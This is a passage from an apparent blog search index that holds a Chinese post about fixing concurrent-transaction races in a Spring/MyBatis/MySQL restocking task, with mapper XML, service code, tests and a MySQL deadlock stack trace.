id，通过注解扫描时默认是通过byType。</li>\n</ul>\n","categories":["Java进阶"],"tags":["Spring","Bean"]},{"title":"工作问题-并发事务","url":"/2018/04/01/%E5%B7%A5%E4%BD%9C%E9%97%AE%E9%A2%98-%E5%B9%B6%E5%8F%91%E4%BA%8B%E5%8A%A1/","content":"<p>现在开发过程中有个需求，商品没货了需要补货，简略版如下：<br>1、发现商品没货，生成补货单<br>2、如果现在有未处理补货单，先删除当前补货单，之后生成新的补货单，如果当前的补货单已经开始处理，那么忽略<br>3、提供API接口供修改状态</p>\n<p>现在数据库设计，状态分为：0：待处理，1：已经认领，2：处理完毕，4：取消<br>简略版数据库如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create table</span> test.item</span><br><span class=\"line\">(</span><br><span class=\"line\">\tid <span class=\"type\">int</span> auto_increment</span><br><span class=\"line\">\t\t<span class=\"keyword\">primary key</span>,</span><br><span class=\"line\">\tsku_code <span class=\"type\">varchar</span>(<span class=\"number\">20</span>) <span class=\"keyword\">not null</span>,</span><br><span class=\"line\">\tnum <span class=\"type\">int</span> <span class=\"keyword\">not null</span>,</span><br><span class=\"line\">\tstatus <span class=\"type\">int</span> <span class=\"keyword\">not null</span>,</span><br><span class=\"line\">\t<span class=\"keyword\">constraint</span> item_id_uindex</span><br><span class=\"line\">\t\t<span class=\"keyword\">unique</span> (id)</span><br><span class=\"line\">)</span><br><span class=\"line\">;</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h3 id=\"项目验证\"><a href=\"#项目验证\" class=\"headerlink\" title=\"项目验证\"></a>项目验证</h3><p>创建Spring项目，配置SpringMVC，Spring、Mybatis</p>\n<p>数据库操作如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">mapper</span> <span class=\"attr\">namespace</span>=<span class=\"string\">&quot;com.whh.mapper.ItemMapper&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--查询列表--&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--通过ID查询数据--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">select</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;query&quot;</span> <span class=\"attr\">resultType</span>=<span class=\"string\">&quot;com.whh.vo.SearchItemVo&quot;</span>&gt;</span></span><br><span class=\"line\">        select id, sku_code as skuCode,num, status from item</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">trim</span> <span class=\"attr\">prefix</span>=<span class=\"string\">&quot;where&quot;</span> <span class=\"attr\">suffixOverrides</span>=<span class=\"string\">&quot;and&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">if</span> <span class=\"attr\">test</span>=<span class=\"string\">&quot;id != null&quot;</span>&gt;</span></span><br><span class=\"line\">                id = #&#123;id&#125; and</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">if</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">if</span> <span class=\"attr\">test</span>=<span class=\"string\">&quot;skuCode != null and skuCode != &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class=\"line\">                sku_code = #&#123;skuCode&#125; and</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">if</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">if</span> <span class=\"attr\">test</span>=<span class=\"string\">&quot;num != null&quot;</span>&gt;</span></span><br><span class=\"line\">                num = #&#123;num&#125; and</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">if</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">if</span> <span class=\"attr\">test</span>=<span class=\"string\">&quot;status != null&quot;</span>&gt;</span></span><br><span class=\"line\">                status = #&#123;status&#125; and</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">if</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">if</span> <span class=\"attr\">test</span>=<span class=\"string\">&quot;notStatus != null&quot;</span>&gt;</span></span><br><span class=\"line\">                status != #&#123;notStatus&#125; and</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">if</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">trim</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--新增数据，插入对象ID会自动设置为自增的ID--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">insert</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;insert&quot;</span> <span class=\"attr\">parameterType</span>=<span class=\"string\">&quot;com.whh.pojo.Item&quot;</span> <span class=\"attr\">useGeneratedKeys</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">keyProperty</span>=<span class=\"string\">&quot;id&quot;</span>&gt;</span></span><br><span class=\"line\">        INSERT INTO item (sku_code,num, status) VALUES (#&#123;skuCode&#125;,#&#123;num&#125;, #&#123;status&#125;)</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">insert</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--关系数据--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">update</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;update&quot;</span> <span class=\"attr\">parameterType</span>=<span class=\"string\">&quot;com.whh.pojo.Item&quot;</span>&gt;</span></span><br><span class=\"line\">        update item set</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">trim</span> <span class=\"attr\">suffixOverrides</span>=<span class=\"string\">&quot;,&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">if</span> <span class=\"attr\">test</span>=<span class=\"string\">&quot;skuCode != null&quot;</span>&gt;</span></span><br><span class=\"line\">                sku_code = #&#123;skuCode&#125;,</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">if</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">if</span> <span class=\"attr\">test</span>=<span class=\"string\">&quot;num != null&quot;</span>&gt;</span></span><br><span class=\"line\">                num = #&#123;num&#125;,</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">if</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">if</span> <span class=\"attr\">test</span>=<span class=\"string\">&quot;status != null&quot;</span>&gt;</span></span><br><span class=\"line\">                status = #&#123;status&#125;</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">if</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">trim</span>&gt;</span></span><br><span class=\"line\">        where id = #&#123;id&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">update</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>先展示错误的示范：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Transactional(rollbackFor = Exception.class)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">createTask</span><span class=\"params\">(String skuCode, Integer num)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">//查询数据库是否存在</span></span><br><span class=\"line\">    <span class=\"type\">SearchItemVo</span> <span class=\"variable\">params</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SearchItemVo</span>();</span><br><span class=\"line\">    params.setSkuCode(skuCode);</span><br><span class=\"line\">    params.setNotStatus(<span class=\"number\">4</span>);</span><br><span class=\"line\">    List&lt;Item&gt; itemList = itemMapper.query(params);</span><br><span class=\"line\">    <span class=\"comment\">//数据库不存在时insert</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (itemList == <span class=\"literal\">null</span> || itemList.isEmpty()) &#123;</span><br><span class=\"line\">        <span class=\"type\">Item</span> <span class=\"variable\">item</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Item</span>(skuCode, num, <span class=\"number\">0</span>);</span><br><span class=\"line\">        result = itemMapper.insert(item);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Item</span> <span class=\"variable\">item</span> <span class=\"operator\">=</span> itemList.get(<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">//数据库存在，且状态为0，设置状态为4，同时生成新的数据</span></span><br><span class=\"line\">        item.setStatus(<span class=\"number\">4</span>);</span><br><span class=\"line\">        result = itemMapper.update(item);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (result == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">            item.setStatus(<span class=\"number\">0</span>);</span><br><span class=\"line\">            item.setNum(num);</span><br><span class=\"line\">            result = itemMapper.insert(item);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编写Test</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class=\"line\"><span class=\"meta\">@ContextConfiguration(locations = &quot;classpath*:applicationContext.xml&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ItemServiceTest</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> ItemService itemService;</span><br><span class=\"line\">    <span class=\"meta\">@Test</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">createTask</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Random</span> <span class=\"variable\">random</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Random</span>();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">num</span> <span class=\"operator\">=</span> random.nextInt(<span class=\"number\">100</span>);</span><br><span class=\"line\">            itemService.createTask(<span class=\"string\">&quot;K000001&quot;</span>, num);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>启动Test测试，查询数据库数据。<br><img src=\"/images/old/20180408%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72018-04-01%E4%B8%8B%E5%8D%882.36.31.png\"><br>数据库中同一个商品非4状态的只有一条。<br>这样存在一个问题，如果出现并发访问，那么数据库中数据就会查询问题</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">concurrentCreateTask</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">skuCode</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;K000001&quot;</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">threadNum</span> <span class=\"operator\">=</span> <span class=\"number\">10</span>;</span><br><span class=\"line\">    Thread[] threads = <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"type\">CountDownLatch</span> <span class=\"variable\">downLatch</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">CountDownLatch</span>(threadNum);</span><br><span class=\"line\">    <span class=\"comment\">//设置多线程创建</span></span><br><span class=\"line\">    IntStream.range(<span class=\"number\">0</span>, threadNum).forEach((i) -&gt; threads[i] = <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; &#123;</span><br><span class=\"line\">        <span class=\"type\">Random</span> <span class=\"variable\">random</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Random</span>();</span><br><span class=\"line\">        IntStream.range(<span class=\"number\">0</span>, <span class=\"number\">100</span>).forEach((j) -&gt; itemService.createTask(skuCode, random.nextInt(<span class=\"number\">10</span>)));</span><br><span class=\"line\">        downLatch.countDown();</span><br><span class=\"line\">    &#125;));</span><br><span class=\"line\">    <span class=\"comment\">//启动线程</span></span><br><span class=\"line\">    Arrays.stream(threads).forEach((Thread::start));</span><br><span class=\"line\">    downLatch.await();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//查询验证最终生成的非4数量</span></span><br><span class=\"line\">    <span class=\"type\">SearchItemVo</span> <span class=\"variable\">searchItemVo</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SearchItemVo</span>();</span><br><span class=\"line\">    searchItemVo.setSkuCode(skuCode);</span><br><span class=\"line\">    searchItemVo.setNotStatus(<span class=\"number\">4</span>);</span><br><span class=\"line\">    List&lt;Item&gt; itemList = itemMapper.query(searchItemVo);</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> itemList != <span class=\"literal\">null</span> &amp;&amp; itemList.size() == <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>启动Test开始测试，结论是肯定的，测试不通过。</p>\n<h4 id=\"分析原因\"><a href=\"#分析原因\" class=\"headerlink\" title=\"分析原因\"></a>分析原因</h4><p>因为在代码中，我们是先查询的数据，之后在做的判断，在并发访问时，可能出现多线程同时查询，都为发现数据库无数据，之后执行后续的插入逻辑。后面判断状态也是同理。</p>\n<p>解决办法：<br><code>INSERT ... ON DUPLICATE KEY UPDATE</code>，表示如果存在就更新，如果不存在就插入，刚刚好这需求之前的要求。<br>但是此处并不适合这个，因为<code>ON DUPLICATE KEY UPDATE</code>判断重复是依据唯一索引，但是在数据库中，<code>sku_code</code>和<code>status</code>无法建立唯一索引，因为可能会出现一个<code>sku_code</code>对应多个重复的<code>status</code>。</p>\n<p>那先解决如果存在在插入数据库。<br>改进sql，在mapper中新增方法</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">insert</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;insertNotExist&quot;</span> <span class=\"attr\">parameterType</span>=<span class=\"string\">&quot;com.whh.pojo.Item&quot;</span> <span class=\"attr\">useGeneratedKeys</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">keyProperty</span>=<span class=\"string\">&quot;id&quot;</span>&gt;</span></span><br><span class=\"line\">    INSERT INTO item (sku_code, num, status) SELECT</span><br><span class=\"line\">                                                #&#123;skuCode&#125;,</span><br><span class=\"line\">                                                #&#123;num&#125;,</span><br><span class=\"line\">                                                #&#123;status&#125;</span><br><span class=\"line\">                                                FROM DUAL</span><br><span class=\"line\">                                                WHERE NOT exists(SELECT id</span><br><span class=\"line\">                                                                FROM item</span><br><span class=\"line\">                                                                WHERE sku_code = #&#123;skuCode&#125; AND status != 4)</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">insert</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>DUAL</code>为临时表。</li>\n</ul>\n<p>通过查询<code>skuCode</code>和<code>status != 4</code>，使用<code>not exists</code>，获取返回的第一条数据，然后进行插入。</p>\n<p>在Mysql中<code>not exists</code>只会返回<code>true</code>或者<code>false</code>，如果返回的是<code>true</code>表示不存在该<code>sku_code</code>且<code>status</code>不为4的数据;反之则返回<code>false</code>，那么将无法插入数据。<br>测试该方法是生效</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\"><span class=\"meta\">@Transactional</span></span><br><span class=\"line\"><span class=\"meta\">@Rollback</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">insertNotExist</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">skuCode</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;K000002&quot;</span>;</span><br><span class=\"line\">    <span class=\"type\">Item</span> <span class=\"variable\">item</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Item</span>(skuCode, <span class=\"number\">10</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"comment\">//判断第一次插入是否成功</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> itemMapper.insertNotExist(item) != <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">//判断第二次插入是否从</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> itemMapper.insertNotExist(item) == <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">SearchItemVo</span> <span class=\"variable\">searchItemVo</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SearchItemVo</span>();</span><br><span class=\"line\">    searchItemVo.setNotStatus(<span class=\"number\">4</span>);</span><br><span class=\"line\">    searchItemVo.setSkuCode(skuCode);</span><br><span class=\"line\">    <span class=\"comment\">//判断数据中非4的数据是否只有1条</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> itemMapper.query(searchItemVo).size() == <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>运行单元测试，验证该方法是生效的。</p>\n<p>解决了数据只有不存在时才插入。<br>下一步就是如果存在数据状态为0，那么需要修改为4<br>Mapper新增update操作：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">update</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;updateInfo&quot;</span>&gt;</span></span><br><span class=\"line\">    UPDATE item set</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">trim</span> <span class=\"attr\">suffixOverrides</span>=<span class=\"string\">&quot;,&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">if</span> <span class=\"attr\">test</span>=<span class=\"string\">&quot;newInfo.skuCode != null&quot;</span>&gt;</span></span><br><span class=\"line\">            sku_code = #&#123;newInfo.skuCode&#125;,</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">if</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">if</span> <span class=\"attr\">test</span>=<span class=\"string\">&quot;newInfo.num != null&quot;</span>&gt;</span></span><br><span class=\"line\">            num = #&#123;newInfo.num&#125;,</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">if</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">if</span> <span class=\"attr\">test</span>=<span class=\"string\">&quot;newInfo.status != null&quot;</span>&gt;</span></span><br><span class=\"line\">            status = #&#123;newInfo.status&#125;</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">if</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">trim</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">trim</span> <span class=\"attr\">prefix</span>=<span class=\"string\">&quot;where&quot;</span> <span class=\"attr\">suffixOverrides</span>=<span class=\"string\">&quot;and&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">if</span> <span class=\"attr\">test</span>=<span class=\"string\">&quot;oldInfo.id != null&quot;</span>&gt;</span></span><br><span class=\"line\">            id = #&#123;oldInfo.id&#125; and</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">if</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">if</span> <span class=\"attr\">test</span>=<span class=\"string\">&quot;oldInfo.skuCode != null&quot;</span>&gt;</span></span><br><span class=\"line\">            sku_code = #&#123;oldInfo.skuCode&#125; and</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">if</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">if</span> <span class=\"attr\">test</span>=<span class=\"string\">&quot;oldInfo.num != null&quot;</span>&gt;</span></span><br><span class=\"line\">            num = #&#123;oldInfo.num&#125; and</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">if</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">if</span> <span class=\"attr\">test</span>=<span class=\"string\">&quot;oldInfo.status != null&quot;</span>&gt;</span></span><br><span class=\"line\">            status = #&#123;oldInfo.status&#125; and</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">if</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">if</span> <span class=\"attr\">test</span>=<span class=\"string\">&quot;oldInfo.id == null and oldInfo.skuCode == null and oldInfo.num == null and oldInfo.status&quot;</span>&gt;</span></span><br><span class=\"line\">            false</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">if</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">trim</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">update</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>注：最后设置如果传入的查询条件为null，那么就不做更新，避免因为没有查询条件导致更新整张表。</li>\n</ul>\n<p>在一般情况下，更新时只是通过主键直接更新值，这样在并发情况下会出现多个线程更新，且都更新成功。<br>如：现在一个线程更新状态为4，生成新数据，另一个线程更新状态为1，设置为认领，这样就会导致上一个线程更新后，下一个线程又直接修改了值，导致数据出现错误。<br>所以在处理这种情况时需要加入状态进行判断（CAS）。</p>\n<h4 id=\"改进代码\"><a href=\"#改进代码\" class=\"headerlink\" title=\"改进代码\"></a>改进代码</h4><p>修改之前逻辑为新代码，如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Transactional(rollbackFor = Exception.class)</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">createTaskImprove</span><span class=\"params\">(String skuCode, Integer num)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">Item</span> <span class=\"variable\">item</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Item</span>(skuCode, num, <span class=\"number\">0</span>);</span><br><span class=\"line\">    result = itemMapper.insertNotExist(item);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (result == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//构造旧数据用于查询，</span></span><br><span class=\"line\">        <span class=\"type\">Item</span> <span class=\"variable\">oldItem</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Item</span>(skuCode, <span class=\"literal\">null</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"type\">Item</span> <span class=\"variable\">newItem</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Item</span>(skuCode, <span class=\"literal\">null</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\">        result = itemMapper.updateInfo(oldItem, newItem);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (result != <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            result = itemMapper.insertNotExist(item);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>开启并发测试，理论上是应该OK了，但是启动单元测试后，出现了错误。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Exception in thread &quot;Thread-5&quot; Exception in thread &quot;Thread-9&quot; Exception in thread &quot;Thread-11&quot; org.springframework.dao.DeadlockLoserDataAccessException: </span><br><span class=\"line\">### Error updating database.  Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLTransactionRollbackException: Deadlock found when trying to get lock; try restarting transaction</span><br><span class=\"line\">### The error may involve com.whh.mapper.ItemMapper.insertNotExist-Inline</span><br><span class=\"line\">### The error occurred while setting parameters</span><br><span class=\"line\">### SQL: INSERT INTO item (sku_code, num, status) SELECT                                                    ?,                                                    ?,                                                    ?                                                  FROM DUAL                                                  WHERE NOT exists(SELECT id                                                                   FROM item                                                                   WHERE sku_code = ? AND status != 4)</span><br><span class=\"line\">### Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLTransactionRollbackException: Deadlock found when trying to get lock; try restarting transaction</span><br><span class=\"line\">; SQL []; Deadlock found when trying to get lock; try restarting transaction; nested exception is com.mysql.jdbc.exceptions.jdbc4.MySQLTransactionRollbackException: Deadlock found when trying to get lock; try restarting transaction</span><br><span class=\"line\">\tat org.springframework.jdbc.support.SQLErrorCodeSQLExceptionTranslator.doTranslate(SQLErrorCodeSQLExceptionTranslator.java:263)</span><br><span class=\"line\">\tat org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:73)</span><br><span class=\"line\">\tat org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:74)</span><br><span class=\"line\">\tat org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:421)</span><br><span class=\"line\">\tat com.sun.proxy.$Proxy20.insert(Unknown Source)</span><br><span class=\"line\">\tat org.mybatis.spring.SqlSessionTemplate.insert(SqlSessionTemplate.java:254)</span><br><span class=\"line\">\tat org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:52)</span><br><span class=\"line\">\tat org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:53)</span><br><span class=\"line\">\tat com.sun.proxy.$Proxy24.insertNotExist(Unknown Source)</span><br><span class=\"line\">\tat com.whh.service.ItemService.createTaskImprove(ItemService.java:66)</span><br><span class=\"line\">\tat com.whh.service.ItemService$$FastClassBySpringCGLIB$$a83be025.invoke(&lt;generated&gt;)</span><br><span class=\"line\">\tat org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204)</span><br><span class=\"line\">\tat org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:651)</span><br><span class=\"line\">\tat com.whh.service.ItemService$$EnhancerBySpringCGLIB$$bc7432b6.createTaskImprove(&lt;generated&gt;)</span><br><span class=\"line\">\tat com.whh.service.ItemServiceTest.lambda$null$3(ItemServiceTest.java:80)</span><br><span class=\"line\">\tat java.util.stream.Streams$RangeIntSpliterator.forEachRemaining(Streams.java:110)</span><br><span class=\"line\">\tat java.util.stream.IntPipeline$Head.forEach(IntPipeline.java:557)</span><br><span class=\"line\">\tat com.whh.service.ItemServiceTest.lambda$null$4(ItemServiceTest.java:80)</span><br><span class=\"line\">\tat java.lang.Thread.run(Thread.java:745)</span><br><span class=\"line\">Caused by: com.mysql.jdbc.exceptions.jdbc4.MySQLTransactionRollbackException: Deadlock found when trying to get lock; try restarting transaction</span><br><span class=\"line\">\tat sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)</span><br><span class=\"line\">\tat sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)</span><br><span class=\"line\">\tat sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)</span><br><span class=\"line\">\tat java.lang.reflect.Constructor.newInstance(Constructor.java:422)</span><br><span class=\"line\">\tat com.mysql.jdbc.Util.handleNewInstance(Util.java:409)</span><br><span class=\"line\">\tat com.mysql.jdbc.Util.getInstance(Util.java:384)</span><br><span class=\"line\">\tat com.mysql.jdbc.SQLError.createSQLException(SQLError.java:1064)</span><br><span class=\"line\">\tat com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:4232)</span><br><span class=\"line\">\tat com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:4164)</span><br><span class=\"line\">\tat com.mysql.jdbc.MysqlIO.sendCommand(MysqlIO.java:2615)</span><br><span class=\"line\">\tat com.mysql.jdbc.MysqlIO.sqlQueryDirect(MysqlIO.java:2776)</span><br><span class=\"line\">\tat com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2838)</span><br><span class=\"line\">\tat com.mysql.jdbc.PreparedStatement.executeInternal(PreparedStatement.java:2082)</span><br><span class=\"line\">\tat 